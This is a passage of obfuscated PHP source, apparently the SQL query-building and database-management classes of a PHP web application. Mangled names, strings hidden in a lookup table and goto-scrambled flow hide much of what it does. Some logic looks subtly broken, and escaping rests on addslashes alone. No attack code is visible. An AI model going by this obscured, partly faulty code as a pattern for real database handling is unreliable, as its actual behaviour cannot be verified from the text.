$cÇš‚í›ôß[2]) { $a´ì®¯«î¨ .= $bº¢‹ç£™Ò . $E·Š÷¯†Ãì[60] . $this->exp[$c˜óŞèÚ] . $E·Š÷¯†Ãì[60] . $cÇš‚í›ôß[1]; } else { if (is_string($cÇš‚í›ôß[1])) { $cÇš‚í›ôß[1] = explode($E·Š÷¯†Ãì[57], $cÇš‚í›ôß[1]); } $e¨Í– À = implode($E·Š÷¯†Ãì[57], $this->parseValue($cÇš‚í›ôß[1])); $a´ì®¯«î¨ .= $bº¢‹ç£™Ò . $E·Š÷¯†Ãì[60] . $this->exp[$c˜óŞèÚ] . $E·Š÷¯†Ãì[887] . $e¨Í– À . $E·Š÷¯†Ãì[889]; } } elseif (preg_match($E·Š÷¯†Ãì[1002], $cÇš‚í›ôß[0])) { $AÜÈ´êÑÈ = is_string($cÇš‚í›ôß[1]) ? explode($E·Š÷¯†Ãì[57], $cÇš‚í›ôß[1]) : $cÇš‚í›ôß[1]; $a´ì®¯«î¨ .= $E·Š÷¯†Ãì[887] . $bº¢‹ç£™Ò . $E·Š÷¯†Ãì[60] . $this->exp[$c˜óŞèÚ] . $E·Š÷¯†Ãì[60] . $this->parseValue($AÜÈ´êÑÈ[0]) . $E·Š÷¯†Ãì[985] . $this->parseValue($AÜÈ´êÑÈ[1]) . $E·Š÷¯†Ãì[286]; } else { think_exception(think_lang($E·Š÷¯†Ãì[988]) . $E·Š÷¯†Ãì[4] . $cÇš‚í›ôß[0]); } } else { $bóàÂº‚¦‚ = count($cÇš‚í›ôß); $a£¬–Ó˜–Ã = $E·Š÷¯†Ãì[43]; if (is_string($cÇš‚í›ôß[$bóàÂº‚¦‚ - 1])) { $a£¬–Ó˜–Ã = isset($cÇš‚í›ôß[$bóàÂº‚¦‚ - 1]) ? strtoupper($cÇš‚í›ôß[$bóàÂº‚¦‚ - 1]) : $E·Š÷¯†Ãì[43]; if (in_array($a£¬–Ó˜–Ã, array($E·Š÷¯†Ãì[982], $E·Š÷¯†Ãì[983], $E·Š÷¯†Ãì[984]))) { $bóàÂº‚¦‚ = $bóàÂº‚¦‚ - 1; } } else { $a£¬–Ó˜–Ã = $E·Š÷¯†Ãì[982]; } for ($f¿•ÉÁè¼ = 0; $f¿•ÉÁè¼ < $bóàÂº‚¦‚; $f¿•ÉÁè¼++) { $AÜÈ´êÑÈ = is_array($cÇš‚í›ôß[$f¿•ÉÁè¼]) ? $cÇš‚í›ôß[$f¿•ÉÁè¼][1] : $cÇš‚í›ôß[$f¿•ÉÁè¼]; if ($E·Š÷¯†Ãì[305] == strtolower($cÇš‚í›ôß[$f¿•ÉÁè¼][0])) { $a´ì®¯«î¨ .= $E·Š÷¯†Ãì[268] . $bº¢‹ç£™Ò . $E·Š÷¯†Ãì[60] . $AÜÈ´êÑÈ . $E·Š÷¯†Ãì[999] . $a£¬–Ó˜–Ã . $E·Š÷¯†Ãì[60]; } else { $e™–‡Äô«Ò = is_array($cÇš‚í›ôß[$f¿•ÉÁè¼]) ? $this->exp[strtolower($cÇš‚í›ôß[$f¿•ÉÁè¼][0])] : $E·Š÷¯†Ãì[975]; if (!$e™–‡Äô«Ò && is_array($cÇš‚í›ôß[$f¿•ÉÁè¼]) && in_array($cÇš‚í›ôß[$f¿•ÉÁè¼][0], array($E·Š÷¯†Ãì[975], $E·Š÷¯†Ãì[992], $E·Š÷¯†Ãì[993], $E·Š÷¯†Ãì[994], $E·Š÷¯†Ãì[995], $E·Š÷¯†Ãì[996]))) { $e™–‡Äô«Ò = $cÇš‚í›ôß[$f¿•ÉÁè¼][0]; } $a´ì®¯«î¨ .= $E·Š÷¯†Ãì[268] . $bº¢‹ç£™Ò . $E·Š÷¯†Ãì[60] . $e™–‡Äô«Ò . $E·Š÷¯†Ãì[60] . $this->parseValue($AÜÈ´êÑÈ) . $E·Š÷¯†Ãì[999] . $a£¬–Ó˜–Ã . $E·Š÷¯†Ãì[60]; } } $a´ì®¯«î¨ = substr($a´ì®¯«î¨, 0, -4); } } else { $a´ì®¯«î¨ .= $bº¢‹ç£™Ò . $E·Š÷¯†Ãì[1003] . $this->parseValue($cÇš‚í›ôß); } return $a´ì®¯«î¨; } protected function parseThinkWhere($F˜ôøªíÃÁ, $D‹µÇàãƒ‰) { $A‰¢½„ø =& $_SERVER[œÕÊİğö]; $CñÎõÃ†˜† = $A‰¢½„ø[43]; switch ($F˜ôøªíÃÁ) { case $A‰¢½„ø[360]: $CñÎõÃ†˜† = $D‹µÇàãƒ‰; break; case $A‰¢½„ø[986]: $CñÎõÃ†˜† = is_string($D‹µÇàãƒ‰) ? $D‹µÇàãƒ‰ : substr($this->parseWhere($D‹µÇàãƒ‰), 6); break; case $A‰¢½„ø[1004]: parse_str($D‹µÇàãƒ‰, $cİÛïŒÛ¡—); if (isset($cİÛïŒÛ¡—[$A‰¢½„ø[981]])) { $fâ—·ù”®‡ = $A‰¢½„ø[60] . strtoupper($cİÛïŒÛ¡—[$A‰¢½„ø[981]]) . $A‰¢½„ø[60]; unset($cİÛïŒÛ¡—[$A‰¢½„ø[981]]); } else { $fâ—·ù”®‡ = $A‰¢½„ø[985]; } $fÉ÷ô¿Å·º = array(); foreach ($cİÛïŒÛ¡— as $aÁ‚†˜äê¡ => $EˆÂ¶Ç´ÙÎ) { $fÉ÷ô¿Å·º[] = $this->parseKey($aÁ‚†˜äê¡) . $A‰¢½„ø[1003] . $this->parseValue($EˆÂ¶Ç´ÙÎ); } $CñÎõÃ†˜† = implode($fâ—·ù”®‡, $fÉ÷ô¿Å·º); break; } return $CñÎõÃ†˜†; } protected function parseLimit($DÁ¢‘Ûåç¤) { $bŒí·Âè‡ =& $_SERVER[œÕÊİğö]; return !empty($DÁ¢‘Ûåç¤) ? $bŒí·Âè‡[58] . $DÁ¢‘Ûåç¤ . $bŒí·Âè‡[60] : $bŒí·Âè‡[43]; } protected function parseJoin($EÖÛŞØˆ«É) { $Aˆ¿Í°¼Í =& $_SERVER[œÕÊİğö]; $dˆæĞ‹ø‡ã = $Aˆ¿Í°¼Í[43]; if (!empty($EÖÛŞØˆ«É)) { if (is_array($EÖÛŞØˆ«É)) { foreach ($EÖÛŞØˆ«É as $dÅÇ’¦¿­® => $DÚØÆ¶¬) { if (!1 !== stripos($DÚØÆ¶¬, $Aˆ¿Í°¼Í[1005])) { $dˆæĞ‹ø‡ã .= $Aˆ¿Í°¼Í[60] . $DÚØÆ¶¬; } else { $dˆæĞ‹ø‡ã .= $Aˆ¿Í°¼Í[1006] . $DÚØÆ¶¬; } } } else { $dˆæĞ‹ø‡ã .= $Aˆ¿Í°¼Í[1006] . $EÖÛŞØˆ«É; } } $dˆæĞ‹ø‡ã = preg_replace($Aˆ¿Í°¼Í[1007], think_config($Aˆ¿Í°¼Í[913]) . $Aˆ¿Í°¼Í[1008], $dˆæĞ‹ø‡ã); return $dˆæĞ‹ø‡ã; } protected function parseOrder($E­¸´¨öÏ) { $eÂÌ’ÅÕÏî =& $_SERVER[œÕÊİğö]; if (is_array($E­¸´¨öÏ)) { $fŒ™ÀÃøÓ’ = array(); foreach ($E­¸´¨öÏ as $aõİÈ“¸Åˆ => $f©ù™›·¼“) { if (is_numeric($aõİÈ“¸Åˆ)) { $fŒ™ÀÃøÓ’[] = $this->parseKey($f©ù™›·¼“); } else { $f©ù™›·¼“ = in_array(strtoupper(trim($f©ù™›·¼“)), array($eÂÌ’ÅÕÏî[1009], $eÂÌ’ÅÕÏî[1010])) ? $eÂÌ’ÅÕÏî[60] . $f©ù™›·¼“ : $eÂÌ’ÅÕÏî[43]; if (preg_match($eÂÌ’ÅÕÏî[1011], $aõİÈ“¸Åˆ)) { $fŒ™ÀÃøÓ’[] = $this->parseKey($aõİÈ“¸Åˆ) . $f©ù™›·¼“; } else { think_exception($eÂÌ’ÅÕÏî[1012] . $aõİÈ“¸Åˆ); } } } $E­¸´¨öÏ = implode($eÂÌ’ÅÕÏî[57], $fŒ™ÀÃøÓ’); } return !empty($E­¸´¨öÏ) ? $eÂÌ’ÅÕÏî[1013] . $E­¸´¨öÏ : $eÂÌ’ÅÕÏî[43]; } protected function parseGroup($A¡™êÙ×) { $B§‘‹‡‡Íç =& $_SERVER[œÕÊİğö]; return !empty($A¡™êÙ×) ? $B§‘‹‡‡Íç[1014] . $A¡™êÙ× : $B§‘‹‡‡Íç[43]; } protected function parseHaving($c†ÕŸ¥£î¤) { $AçÍ¿ç’Ç´ =& $_SERVER[œÕÊİğö]; return !empty($c†ÕŸ¥£î¤) ? $AçÍ¿ç’Ç´[1015] . $c†ÕŸ¥£î¤ : $AçÍ¿ç’Ç´[43]; } protected function parseComment($E»ó¿îà¸İ) { $Fø›ôñ¦‡É =& $_SERVER[œÕÊİğö]; return !empty($E»ó¿îà¸İ) ? $Fø›ôñ¦‡É[1016] . $E»ó¿îà¸İ . $Fø›ôñ¦‡É[1017] : $Fø›ôñ¦‡É[43]; } protected function parseDistinct($BŒ«ùçŒê‡) { $eëóÕƒùÛæ =& $_SERVER[œÕÊİğö]; return !empty($BŒ«ùçŒê‡) ? $eëóÕƒùÛæ[1018] : $eëóÕƒùÛæ[43]; } protected function parseUnion($b«ÃÄ÷ª±©) { $Bó‚Â¯±ç’ =& $_SERVER[œÕÊİğö]; if (empty($b«ÃÄ÷ª±©)) { return $Bó‚Â¯±ç’[43]; } if (isset($b«ÃÄ÷ª±©[$Bó‚Â¯±ç’[356]])) { $c÷‘çˆÊß = $Bó‚Â¯±ç’[1019]; unset($b«ÃÄ÷ª±©[$Bó‚Â¯±ç’[356]]); } else { $c÷‘çˆÊß = $Bó‚Â¯±ç’[1020]; } foreach ($b«ÃÄ÷ª±© as $E›ÙóãÇš) { $fãĞÜ ¥µñ[] = $c÷‘çˆÊß . (is_array($E›ÙóãÇš) ? $this->buildSelectSql($E›ÙóãÇš) : $E›ÙóãÇš); } return implode($Bó‚Â¯±ç’[60], $fãĞÜ ¥µñ); } public function insert($fêõŞ»åØ, $c¨æ°¤‘âÅ = array(), $b‘ê¤ ‹‚µ = false) { goto b…”©¼ğô†; EŠÆ‰¬¶Êö: foreach ($fêõŞ»åØ as $BÖ¼¢ìÌà => $AØÁã¬ó‡İ) { if (is_array($AØÁã¬ó‡İ) && $CÈá¼·ÜÛ[305] == $AØÁã¬ó‡İ[0]) { $c¶“¹Ø¢°§[] = $this->parseKey($BÖ¼¢ìÌà); $eö—÷ èº[] = $AØÁã¬ó‡İ[1]; } elseif (is_scalar($AØÁã¬ó‡İ) || is_null($AØÁã¬ó‡İ)) { $c¶“¹Ø¢°§[] = $this->parseKey($BÖ¼¢ìÌà); $eö—÷ èº[] = $this->parseValue($AØÁã¬ó‡İ); } } $AØÕšÓôÛß = ($b‘ê¤ ‹‚µ ? $CÈá¼·ÜÛ[891] : $CÈá¼·ÜÛ[892]) . $CÈá¼·ÜÛ[893] . $this->parseTable($c¨æ°¤‘âÅ[$CÈá¼·ÜÛ[287]]) . $CÈá¼·ÜÛ[887] . implode($CÈá¼·ÜÛ[57], $c¶“¹Ø¢°§) . $CÈá¼·ÜÛ[888] . implode($CÈá¼·ÜÛ[57], $eö—÷ èº) . $CÈá¼·ÜÛ[889]; $AØÕšÓôÛß .= $this->parseLock(isset($c¨æ°¤‘âÅ[$CÈá¼·ÜÛ[844]]) ? $c¨æ°¤‘âÅ[$CÈá¼·ÜÛ[844]] : !1); goto aŒÒƒ©èÃ˜; aŒÒƒ©èÃ˜: $AØÕšÓôÛß .= $this->parseComment(!empty($c¨æ°¤‘âÅ[$CÈá¼·ÜÛ[362]]) ? $c¨æ°¤‘âÅ[$CÈá¼·ÜÛ[362]] : $CÈá¼·ÜÛ[43]); return $this->execute($AØÕšÓôÛß, $this->parseBind(!empty($c¨æ°¤‘âÅ[$CÈá¼·ÜÛ[293]]) ? $c¨æ°¤‘âÅ[$CÈá¼·ÜÛ[293]] : array())); goto BÂ¨ÆĞ¥„¯; b…”©¼ğô†: $CÈá¼·ÜÛ =& $_SERVER[œÕÊİğö]; $eö—÷ èº = $c¶“¹Ø¢°§ = array(); $this->model = $c¨æ°¤‘âÅ[$CÈá¼·ÜÛ[289]]; goto EŠÆ‰¬¶Êö; BÂ¨ÆĞ¥„¯: } public function selectInsert($B¨§ï½Ó‘Ñ, $b÷‰ƒ±Â°Ì, $e×Õç¢°ª« = array()) { goto A†«µ™¨´; EÎñ’¼ˆ—×: array_walk($B¨§ï½Ó‘Ñ, array($this, $d•îé«ß«[890])); $f÷ÃÁ«Ô¡„ = $d•îé«ß«[1021] . $this->parseTable($b÷‰ƒ±Â°Ì) . $d•îé«ß«[887] . implode($d•îé«ß«[57], $B¨§ï½Ó‘Ñ) . $d•îé«ß«[999]; $f÷ÃÁ«Ô¡„ .= $this->buildSelectSql($e×Õç¢°ª«); goto f§ÆíŠâÌ¥; A†«µ™¨´: $d•îé«ß« =& $_SERVER[œÕÊİğö]; $this->model = $e×Õç¢°ª«[$d•îé«ß«[289]]; if (is_string($B¨§ï½Ó‘Ñ)) { $B¨§ï½Ó‘Ñ = explode($d•îé«ß«[57], $B¨§ï½Ó‘Ñ); } goto EÎñ’¼ˆ—×; f§ÆíŠâÌ¥: return $this->execute($f÷ÃÁ«Ô¡„, $this->parseBind(!empty($e×Õç¢°ª«[$d•îé«ß«[293]]) ? $e×Õç¢°ª«[$d•îé«ß«[293]] : array())); goto a«§ÅÍí–Ş; a«§ÅÍí–Ş: } public function update($Aß¾ÓÁ„†, $D êÉŞ™µ¥) { $bÍ¶¢ÅŒ¢’ =& $_SERVER[œÕÊİğö]; $this->model = $D êÉŞ™µ¥[$bÍ¶¢ÅŒ¢’[289]]; $bëŠÔË™´ = $bÍ¶¢ÅŒ¢’[1022] . $this->parseTable($D êÉŞ™µ¥[$bÍ¶¢ÅŒ¢’[287]]) . $this->parseSet($Aß¾ÓÁ„†) . $this->parseWhere(!empty($D êÉŞ™µ¥[$bÍ¶¢ÅŒ¢’[283]]) ? $D êÉŞ™µ¥[$bÍ¶¢ÅŒ¢’[283]] : $bÍ¶¢ÅŒ¢’[43]) . $this->parseOrder(!empty($D êÉŞ™µ¥[$bÍ¶¢ÅŒ¢’[373]]) ? $D êÉŞ™µ¥[$bÍ¶¢ÅŒ¢’[373]] : $bÍ¶¢ÅŒ¢’[43]) . $this->parseLimit(!empty($D êÉŞ™µ¥[$bÍ¶¢ÅŒ¢’[300]]) ? $D êÉŞ™µ¥[$bÍ¶¢ÅŒ¢’[300]] : $bÍ¶¢ÅŒ¢’[43]) . $this->parseLock(isset($D êÉŞ™µ¥[$bÍ¶¢ÅŒ¢’[844]]) ? $D êÉŞ™µ¥[$bÍ¶¢ÅŒ¢’[844]] : !1) . $this->parseComment(!empty($D êÉŞ™µ¥[$bÍ¶¢ÅŒ¢’[362]]) ? $D êÉŞ™µ¥[$bÍ¶¢ÅŒ¢’[362]] : $bÍ¶¢ÅŒ¢’[43]); return $this->execute($bëŠÔË™´, $this->parseBind(!empty($D êÉŞ™µ¥[$bÍ¶¢ÅŒ¢’[293]]) ? $D êÉŞ™µ¥[$bÍ¶¢ÅŒ¢’[293]] : array())); } public function delete($A©¿®Í‰ˆî = array()) { $B¡¸êÌİ =& $_SERVER[œÕÊİğö]; $this->model = $A©¿®Í‰ˆî[$B¡¸êÌİ[289]]; $fŠãœ·£«‘ = $B¡¸êÌİ[1023] . $this->parseTable($A©¿®Í‰ˆî[$B¡¸êÌİ[287]]) . $this->parseWhere(!empty($A©¿®Í‰ˆî[$B¡¸êÌİ[283]]) ? $A©¿®Í‰ˆî[$B¡¸êÌİ[283]] : $B¡¸êÌİ[43]) . $this->parseOrder(!empty($A©¿®Í‰ˆî[$B¡¸êÌİ[373]]) ? $A©¿®Í‰ˆî[$B¡¸êÌİ[373]] : $B¡¸êÌİ[43]) . $this->parseLimit(!empty($A©¿®Í‰ˆî[$B¡¸êÌİ[300]]) ? $A©¿®Í‰ˆî[$B¡¸êÌİ[300]] : $B¡¸êÌİ[43]) . $this->parseLock(isset($A©¿®Í‰ˆî[$B¡¸êÌİ[844]]) ? $A©¿®Í‰ˆî[$B¡¸êÌİ[844]] : !1) . $this->parseComment(!empty($A©¿®Í‰ˆî[$B¡¸êÌİ[362]]) ? $A©¿®Í‰ˆî[$B¡¸êÌİ[362]] : $B¡¸êÌİ[43]); return $this->execute($fŠãœ·£«‘, $this->parseBind(!empty($A©¿®Í‰ˆî[$B¡¸êÌİ[293]]) ? $A©¿®Í‰ˆî[$B¡¸êÌİ[293]] : array())); } public function select($c§ùƒ†‡˜İ = array()) { goto c³„ˆæèß˜; a¹ßÀÀ‘‰: if ($dñ‚¸‘ÀÜÆ && !1 !== $A­½¼ª‚) { think_cache($E§‰Üƒ¤ßŒ, $A­½¼ª‚, $dñ‚¸‘ÀÜÆ); } return $A­½¼ª‚; goto FêÚ³™·Ó×; c³„ˆæèß˜: $aòÈ¼ñÙ² =& $_SERVER[œÕÊİğö]; $this->model = $c§ùƒ†‡˜İ[$aòÈ¼ñÙ²[289]]; $F´‚¤ºÆî– = $this->buildSelectSql($c§ùƒ†‡˜İ); goto CÚª šò¾; CÚª šò¾: $dñ‚¸‘ÀÜÆ = isset($c§ùƒ†‡˜İ[$aòÈ¼ñÙ²[357]]) ? $c§ùƒ†‡˜İ[$aòÈ¼ñÙ²[357]] : !1; if ($dñ‚¸‘ÀÜÆ) { $E§‰Üƒ¤ßŒ = is_string($dñ‚¸‘ÀÜÆ[$aòÈ¼ñÙ²[103]]) ? $dñ‚¸‘ÀÜÆ[$aòÈ¼ñÙ²[103]] : $aòÈ¼ñÙ²[1024] . md5($F´‚¤ºÆî–); $fôŒÁÔÂÃº = think_cache($E§‰Üƒ¤ßŒ, $aòÈ¼ñÙ²[43], $dñ‚¸‘ÀÜÆ); if (!1 !== $fôŒÁÔÂÃº) { return $fôŒÁÔÂÃº; } } $A­½¼ª‚ = $this->query($F´‚¤ºÆî–, $this->parseBind(!empty($c§ùƒ†‡˜İ[$aòÈ¼ñÙ²[293]]) ? $c§ùƒ†‡˜İ[$aòÈ¼ñÙ²[293]] : array())); goto a¹ßÀÀ‘‰; FêÚ³™·Ó×: } public function buildSelectSql($eƒ µ‹ … = array()) { goto D‚æŞáôÌ; D‚æŞáôÌ: $B‚‚»¥Ûõ =& $_SERVER[œÕÊİğö]; if (isset($eƒ µ‹ …[$B‚‚»¥Ûõ[361]])) { if (strpos($eƒ µ‹ …[$B‚‚»¥Ûõ[361]], $B‚‚»¥Ûõ[57])) { list($DÀ¬„ŸÅæ, $c˜´…²áºÛ) = explode($B‚‚»¥Ûõ[57], $eƒ µ‹ …[$B‚‚»¥Ûõ[361]]); } else { $DÀ¬„ŸÅæ = $eƒ µ‹ …[$B‚‚»¥Ûõ[361]]; } $DÀ¬„ŸÅæ = $DÀ¬„ŸÅæ ? $DÀ¬„ŸÅæ : 1; $c˜´…²áºÛ = isset($c˜´…²áºÛ) ? $c˜´…²áºÛ : (is_numeric($eƒ µ‹ …[$B‚‚»¥Ûõ[300]]) ? $eƒ µ‹ …[$B‚‚»¥Ûõ[300]] : 20); $CŞÁÑ«ãßˆ = $c˜´…²áºÛ * ((int) $DÀ¬„ŸÅæ - 1); $eƒ µ‹ …[$B‚‚»¥Ûõ[300]] = $CŞÁÑ«ãßˆ . $B‚‚»¥Ûõ[57] . $c˜´…²áºÛ; } if (think_config($B‚‚»¥Ûõ[1025])) { $b°´â‹×òŠ = $B‚‚»¥Ûõ[1026] . md5(serialize($eƒ µ‹ …)); $FÃç„ÕœğŒ = think_cache($b°´â‹×òŠ); if ($FÃç„ÕœğŒ) { return $FÃç„ÕœğŒ; } } goto a””Ş¸š¿¤; a‹ŸÒŒÚô‡: return $Aˆø—©‡í; goto a«Àê°ˆÈ…; a””Ş¸š¿¤: $Aˆø—©‡í = $this->parseSql($this->selectSql, $eƒ µ‹ …); $Aˆø—©‡í .= $this->parseLock(isset($eƒ µ‹ …[$B‚‚»¥Ûõ[844]]) ? $eƒ µ‹ …[$B‚‚»¥Ûõ[844]] : !1); if (isset($b°´â‹×òŠ)) { think_cache($b°´â‹×òŠ, $Aˆø—©‡í); } goto a‹ŸÒŒÚô‡; a«Àê°ˆÈ…: } public function parseSql($AĞáí¿àÈ, $A¸Ä‚¦Û½ñ = array()) { $CÂÉù¥˜í¤ =& $_SERVER[œÕÊİğö]; $AĞáí¿àÈ = str_replace(array($CÂÉù¥˜í¤[1027], $CÂÉù¥˜í¤[1028], $CÂÉù¥˜í¤[1029], $CÂÉù¥˜í¤[1030], $CÂÉù¥˜í¤[1031], $CÂÉù¥˜í¤[1032], $CÂÉù¥˜í¤[1033], $CÂÉù¥˜í¤[1034], $CÂÉù¥˜í¤[1035], $CÂÉù¥˜í¤[1036], $CÂÉù¥˜í¤[1037]), array($this->parseTable("{$A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[287]]}"), $this->parseDistinct(isset($A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[1038]]) ? $A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[1038]] : !1), $this->parseField(!empty($A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[281]]) ? $A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[281]] : $CÂÉù¥˜í¤[192]), $this->parseJoin(!empty($A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[290]]) ? $A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[290]] : $CÂÉù¥˜í¤[43]), $this->parseWhere(!empty($A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[283]]) ? $A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[283]] : $CÂÉù¥˜í¤[43]), $this->parseGroup(!empty($A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[518]]) ? $A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[518]] : $CÂÉù¥˜í¤[43]), $this->parseHaving(!empty($A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[1039]]) ? $A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[1039]] : $CÂÉù¥˜í¤[43]), $this->parseOrder(!empty($A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[373]]) ? $A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[373]] : $CÂÉù¥˜í¤[43]), $this->parseLimit(!empty($A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[300]]) ? $A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[300]] : $CÂÉù¥˜í¤[43]), $this->parseUnion(!empty($A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[355]]) ? $A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[355]] : $CÂÉù¥˜í¤[43]), $this->parseComment(!empty($A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[362]]) ? $A¸Ä‚¦Û½ñ[$CÂÉù¥˜í¤[362]] : $CÂÉù¥˜í¤[43])), $AĞáí¿àÈ); return $AĞáí¿àÈ; } public function getLastSql($Dîèõ—ç¤Ô = '') { return $Dîèõ—ç¤Ô ? $this->modelSql[$Dîèõ—ç¤Ô] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($e›–©õ“òÓ) { return addslashes($e›–©õ“òÓ); } public function setModel($aŸÊÌîõêÆ) { $this->model = $aŸÊÌîõêÆ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($AŸÛ©¥‚ç…, $DÂ”°¢‚¦´ = '') { $this->database = $AŸÛ©¥‚ç…; $this->type = $DÂ”°¢‚¦´; } public function model($dİóÉº´ = '') { return new ModelBase($dİóÉº´, $_SERVER[œÕÊİğö][43], $this->database); } public function db($BÊœÄãÖ« = false) { goto aõÔô­ÏˆŒ; dèëÛºâ‚: $B–ªŞ²‹äÀ = $FÇ¡íĞùµŒ[$F‚òº¥Í’„[953]]; $FÇ¡íĞùµŒ[$F‚òº¥Í’„[953]] = $F‚òº¥Í’„[43]; if ($FÇ¡íĞùµŒ[$F‚òº¥Í’„[786]] == $F‚òº¥Í’„[787]) { $Fì‚ç©Å’Ó = $FÇ¡íĞùµŒ[$F‚òº¥Í’„[788]]; $FÇ¡íĞùµŒ[$F‚òº¥Í’„[788]] = substr($Fì‚ç©Å’Ó, 0, strrpos($Fì‚ç©Å’Ó, $F‚òº¥Í’„[1040])); } goto EÓÚŒí…°; DÛÜÉÚ ãÖ: if (!$dÕä¡ÙŠ) { $cã¾Æ²ŒÜ„->execute("\143\x72\x65\x61\x74\145\x20\x64\x61\164\x61\x62\141\163\145\x20\140{$B–ªŞ²‹äÀ}\x60"); } $FÇ¡íĞùµŒ[$F‚òº¥Í’„[953]] = $B–ªŞ²‹äÀ; if ($FÇ¡íĞùµŒ[$F‚òº¥Í’„[786]] == $F‚òº¥Í’„[787]) { $FÇ¡íĞùµŒ[$F‚òº¥Í’„[788]] .= $F‚òº¥Í’„[1040] . $B–ªŞ²‹äÀ; } goto d¡²Œ¸‘¬„; d¡²Œ¸‘¬„: $this->database = $FÇ¡íĞùµŒ; $cã¾Æ²ŒÜ„->execute("\165\x73\x65\x20\140{$B–ªŞ²‹äÀ}\140"); return $cã¾Æ²ŒÜ„; goto cùêİèó; aõÔô­ÏˆŒ: $F‚òº¥Í’„ =& $_SERVER[œÕÊİğö]; $FÇ¡íĞùµŒ = array_change_key_case($this->database); if ($this->type == $F‚òº¥Í’„[19] || !$BÊœÄãÖ«) { return $this->model()->db(); } goto dèëÛºâ‚; EÓÚŒí…°: $this->database = $FÇ¡íĞùµŒ; $cã¾Æ²ŒÜ„ = $this->model()->db(); try { $dÕä¡ÙŠ = $cã¾Æ²ŒÜ„->execute("\163\x68\x6f\167\x20\144\141\x74\x61\142\x61\x73\x65\x73\40\x6c\151\153\x65\x20\x27{$B–ªŞ²‹äÀ}\x27"); } catch (Exception $ağÊˆÅˆöŠ) { } goto DÛÜÉÚ ãÖ; cùêİèó: } public function createTable($C´£œ£Ì ß, $Bº¦´÷í™• = null) { $dó´©Ó‹‚Æ =& $_SERVER[œÕÊİğö]; if (!IO::exist($C´£œ£Ì ß)) { ActionCall($dó´©Ó‹‚Æ[1041], !0, 0); show_json(LNG($dó´©Ó‹‚Æ[1042]), !1); } $e’™¾”¦ËÂ = sqlSplit(IO::getContent($C´£œ£Ì ß)); foreach ($e’™¾”¦ËÂ as $Eî¤éáğ…ª) { if ($Bº¦´÷í™•) { $c¢Á·âŸå÷ = stripos($Eî¤éáğ…ª, $dó´©Ó‹‚Æ[1043]) === 0; if ($c¢Á·âŸå÷) { $Bº¦´÷í™•->task[$dó´©Ó‹‚Æ[1044]] += 1; } } $this->model()->db()->execute($Eî¤éáğ…ª); if ($Bº¦´÷í™• && $c¢Á·âŸå÷) { preg_match($dó´©Ó‹‚Æ[1045], $Eî¤éáğ…ª, $Cåæ¤„ÃŸ¸); $Bº¦´÷í™•->task[$dó´©Ó‹‚Æ[1046]] = $Cåæ¤„ÃŸ¸[1]; $Bº¦´÷í™•->update(1); } } $this->taskToCache($Bº¦´÷í™•); } public function insertTable($Eƒ—š½ÒÆ“, $E•¾–Ü¨¹Ò = null) { $D…Òç¤©±Ø =& $_SERVER[œÕÊİğö]; $c–Ò®Æôå = $this->model()->db(); $FéÜ‡®¡Ê = $bùŠòÚ´Åù ? array($bùŠòÚ´Åù) : $c–Ò®Æôå->getTables(); foreach ($Eƒ—š½ÒÆ“ as $cŸùè›‰Æ§) { $bùŠòÚ´Åù = basename($cŸùè›‰Æ§, $D…Òç¤©±Ø[776]); if (!in_array($bùŠòÚ´Åù, $FéÜ‡®¡Ê)) { continue; } if ($E•¾–Ü¨¹Ò) { $E•¾–Ü¨¹Ò->task[$D…Òç¤©±Ø[1046]] = $bùŠòÚ´Åù; } if (get_filesize($cŸùè›‰Æ§) == 0) { continue; } $Cß¥ïâªÇò = $this->sqlToDb($cŸùè›‰Æ§, $E•¾–Ü¨¹Ò); if (!$Cß¥ïâªÇò) { ActionCall($D…Òç¤©±Ø[1041], !0, 0); show_json(LNG($D…Òç¤©±Ø[1047]) . "\133{$bùŠòÚ´Åù}\135", !1); } } $this->taskToCache($E•¾–Ü¨¹Ò); } public function sqlFromDb($c»óîçÜ¯¬, $Dçá·’•‡ö, $fŞñµ’ø· = null, $Fèè”µò¡ö = null) { goto EÛ–èóŠ¡Ã; CÙˆÓ¿óÇ™: fclose($A´‡Õîâ®); return $fö¢Ö›Í÷Ÿ; goto dª¡–ÊŒó; EÛ–èóŠ¡Ã: if ($fŞñµ’ø·) { $fŞñµ’ø·->task[$_SERVER[œÕÊİğö][1046]] = $c»óîçÜ¯¬; } $DÇ¿Î•È = $this->model($c»óîçÜ¯¬); $fö¢Ö›Í÷Ÿ = 0; goto E¡™å·Š; E¡™å·Š: $DãÄ”ñÀ = 0; $BÌŸ‘‡ìé‹ = 10000; $A´‡Õîâ® = fopen($Dçá·’•‡ö, $_SERVER[œÕÊİğö][1048]); goto Aª‹ÛÁî¨¸; Aª‹ÛÁî¨¸: $eàªôáŠâË = $DÇ¿Î•È->getPk(); $aÎ»èŒÖÕô = $DÇ¿Î•È->getDbFields(); do { $bèÉ”ËÀ’¾ = array($eàªôáŠâË => array($_SERVER[œÕÊİğö][995], $DãÄ”ñÀ)); $DÉÙ‚ĞƒÔ = $DÇ¿Î•È->where($bèÉ”ËÀ’¾)->field($aÎ»èŒÖÕô)->order($eàªôáŠâË . $_SERVER[œÕÊİğö][1049])->limit($BÌŸ‘‡ìé‹)->select(); $DÉÙ‚ĞƒÔ = !empty($DÉÙ‚ĞƒÔ) ? $DÉÙ‚ĞƒÔ : array(); if 